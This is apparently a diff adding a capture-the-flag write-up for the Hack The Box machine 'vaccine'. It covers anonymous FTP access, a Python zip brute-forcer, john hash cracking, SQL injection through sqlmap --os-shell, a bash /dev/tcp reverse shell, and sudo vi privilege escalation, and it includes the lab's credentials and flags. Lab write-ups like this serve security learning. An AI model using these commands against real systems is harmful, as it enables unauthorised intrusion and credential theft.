@@ -1,0 +1,174 @@
+The target machine has three open ports:
+`nmap -sV -sC [IP]`
+@code txt
+PORT   STATE SERVICE VERSION
+21/tcp open  ftp     vsftpd 3.0.3
+22/tcp open  ssh     OpenSSH 8.0p1 Ubuntu 6ubuntu0.1 (Ubuntu Linux; protocol 2.0)
+80/tcp open  http    Apache httpd 2.4.41 ((Ubuntu))
+@end
+
+Since FTP is an ancient unsecure protocol from the 70s that's probably the way in.
+Still, I've checked the http page and it's a regular login page. 
+I've loaded up gobuster but it seems like there's no luck there.
+
+Let's pursuit the FTP line then.
+
+It's misconfigured to accept guest connections so let's take advantage of that.
+A simple `ftp [IP]` with username `anonymous` and no password gets us in.
+
+Inside we can find a single zip file:
+@code txt
+-rwxr-xr-x    1 0        0            2533 Apr 13  2021 backup.zip
+@end
+
+We can download it to our machine with `get backup.zip`
+When trying to unzip it with `unzip backup.zip` we get prompted for a password.
+
+I'm going to try to brute-force it while I search for other lines to pursue.
+
+Taking inspiration from {https://www.geeksforgeeks.org/how-to-brute-force-zip-file-passwords-in-python/}[this article], I set up the following python script:
+
+@code python
+import zipfile
+import sys
+
+# might need a rework to more clearly convey what I want
+usage_message = "Usage: zipcracker.py FILE.zip WORDLIST.txt"
+if len(sys.argv) < 2:
+    sys.exit(usage_message)
+
+file_is_zip = sys.argv[1][-4:] == '.zip'
+wordlist_is_txt = sys.argv[2][-4:] == '.txt'
+if not file_is_zip or not wordlist_is_txt:
+    sys.exit(usage_message)
+
+def password_crack(zip_file, wordlist):
+    with open(wordlist, 'rb') as file:
+        line_number = 0
+        for line in file:
+            for word in line.split():
+                line_number += 1
+                try:
+                    zip_object = zipfile.ZipFile(zip_file)
+                    zip_object.extractall(pwd=word)
+                    print("Password found at line", line_number)
+                    print("Password is", word.decode())
+                    return True
+                except:
+                    continue
+
+    return False
+
+zip_file = sys.argv[1]
+wordlist = sys.argv[2]
+
+if not password_crack(zip_file, wordlist):
+    print("Password not found in file")
+@end
+
+I could have done more but this was good enough. I tried it with the rockyou wordlist and after less than a second I get:
+@code txt
+Password found at line 869
+Password is 741852963
+@end
+and the decompressed files, which consist of an `index.php` and a `style.css` files.
+
+After skimming through the first file, I see a blatant security issue in the form of a password in the code:
+@code php
+    if($_POST['username'] === 'admin' && md5($_POST['password']) === "2cb42f8734ea607eefed3b70af13bbd3") {
+      $_SESSION['login'] = "true";
+      header("Location: dashboard.php");
+    }
+@end
+
+After a couple of tries of inputting the raw string in the webpage and being redirected back to the login I realise I didn't see the md5 function that's encrypting the password.
+A brief research tells me that MD5 is not unencryptable as it uses a one-way hash function. (It's not impossible but it's way harder than the lab probably requires)
+That means it's time to brute force the password using john.
+I've tried first the command with the standard john/password.lst (the default if you don't input anything):
+
+@code shell
+john --format=raw-MD5 md5.txt
+@end
+
+md5.txt is where I've stored the password. After a couple of minutes to no success I've decided to stop and do rockyou.txt first since that's where we found the first password.
+And indeed, after a whooping 0 seconds of password-cracking, we get the following output:
+@code txt
+qwerty789        (?)
+1g 0:00:00:00 DONE (2023-09-01 18:21) 11.11g/s 1113Kp/s 1113Kc/s 1113KC/s roslin..pogimo
+@end
+
+After successfully logging in I get greeted with a dashboard consisting of a table and a single search bar. I mess around with the search bar for a bit and see that every search sends a request to the backend which could mean there are database shenanigans going on. I'm going to try SQL Injection for good measure.
+
+Luckily enough after trying a couple of inputs I get the one that breaks the query: `'`
+This awards me with the following output:
+@code txt
+ERROR: unterminated quoted string at or near "'" LINE 1: Select * from cars where name ilike '%'%' ^
+@end
+
+This tells me two things: 1. I can do SQL Injection 2. The database in question is PostgreSQL (thanks google)
+
+After what has probably been a couple of hours of investigating and SQL injecting I have learnt the following:
+-- The standard method of SQL injecting is `'; [SQL COMMAND] --`. This finishes the previous query and allows for a next one. However you need to comment the rest to not get an error
+-- But! Errors are the only output we are getting, so to extract any kind of useful information we need to actually have some error along with our output.
+-- {https://pulsesecurity.co.nz/articles/postgres-sqli}[This article] has been really useful to find the different stuff that I can do with PostgreSQL Injection.
+-- However, the best find by far has been SQLMap. With it I can automate the tedious queries that the previous articles was making and just straight up get a shell and the program does all the requesting and parsing outputs.
+
+So just by doing 
+@code shell
+sqlmap -u http://[IP]/dashboard.php?search=1 --os-shell --cookie="PHPSESSID=[VALUE]"
+@end
+I can get a shell inside the system, albeit not a very good one.
+However since I can execute any Linux command I can get a proper reverse shell going:
+@code shell
+bash -c "bash -i >& /dev/tcp/[IP]/[PORT] 0>&1"
+@end
+
+Which nets a slightly better terminal. However it's still not interactive and it can't do things like answer prompts.
+We can upgrade it with:
+@code shell
+python3 -c 'import pty; pty.spawn("/bin/bash")'
+@end
+
+(I found out thanks to {https://blog.ropnop.com/upgrading-simple-shells-to-fully-interactive-ttys/}[this article])
+
+By walking a bit around the directories we find the user flag in the directory above the postgres one:
+ec9b13ca4d6229cd5cc1e09980965bf7
+
+Now for the root flag we'll probably have to escalate.
+Navigating around we find the directory of the web service. In dashboard.php (the remaining php file) we find the login information for the user 'postgres' (the one we are using)
+@code php
+try {
+$conn = pg_connect("host=localhost port=5432 dbname=carsdb user=postgres
+password=P@s5w0rd!");
+}
+@end
+
+With this (if the password is the same) we can do `sudo -l` to find if there's any commands we can execute while privileged. Indeed:
+@code txt
+User postgres may run the following commands on vaccine:
+    (ALL) /bin/vi /etc/postgresql/11/main/pg_hba.conf
+@end
+
+So we replicate the command:
+`sudo /bin/vi /etc/postgresql/11/main/pg_hba.conf`
+
+And from within vi we can do the command `:Ex` to explore around at our leisure (I'll be forever grateful to the countless hours of classes I didn't pay any attention to so I could learn Vim)
+
+
+In the `/root/` directory we can find the root flag:
+dd6e058e814260bc70e9bbdef2715849
+
+Aaand we're done!
+
+Things I have learned from mistakes I've made and from looking at the walkthrough:
+-- I could have cracked the password with the John toolset instead of doing my own Python thing (takes way less time)
+The process would look like this:
+@code shell
+zip2john backup.zip > hashes
+john -wordlist=/usr/share/wordlists/rockyou.txt hashes
+@end
+-- The HTB people really like to make labs that use rockyou.txt passwords. Good note for the future.
+-- The connection with SQLMap kept resetting for some reason. Instead of repeating the same exploit thingy every time, I could have ssh connected to the target machine using the postgres credentials.
+-- I could have done the full escalation of privileges from vi instead of just using `:Ex` to navigate around the file system by using `:set shell=/bin/sh` from within the privileged vi session followed by `:shell`
+
+Good machine! I liked it.
